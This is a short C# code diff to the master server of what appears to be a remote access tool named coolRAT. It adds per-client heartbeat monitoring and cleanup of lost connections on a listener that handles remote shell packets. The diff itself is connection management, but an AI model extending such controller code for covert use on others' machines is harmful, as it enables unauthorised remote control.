@@ -16,13 +16,16 @@ namespace coolRAT.Master
 {
     class Program
     {
+        public static Dictionary<Guid, Client> ConnectedClients = new Dictionary<Guid, Client>();
         static void Main(string[] args)
         {
-            Dictionary<Guid, Client> ConnectedClients = new Dictionary<Guid, Client>();
+            
             CAP_Server server = new CAP_Server(8888);
             server.OnClientConnected += (s, e) =>
             {
                 ConnectedClients.Add(e.Client.UniqueId, e.Client);
+                e.Client.ClientPingService.Start(PingServiceType.Passive);
+                e.Client.ClientPingService.ConnectionLost += ClientPingService_ConnectionLost;
                 e.Client.RegisterPacketHandler("ShellConnectedPacket", (s_, e_) =>
                 {
                     if (e_.Packet.Type != "ShellConnectedPacket")
@@ -40,6 +43,14 @@ namespace coolRAT.Master
             server.Start();
             Console.WriteLine("Client Authorization Protocol server version 1.0.0.0 started");
             Application.Run();
+        }
+
+        private static void ClientPingService_ConnectionLost(object sender, ConnectionLostEventArgs e)
+        {
+            if (!ConnectedClients.ContainsKey(e.Client.UniqueId)) return;
+            e.Client.ClientPingService.Stop();
+            e.Client.Connection.StopAll();
+            ConnectedClients.Remove(e.Client.UniqueId);
         }
     }
 }
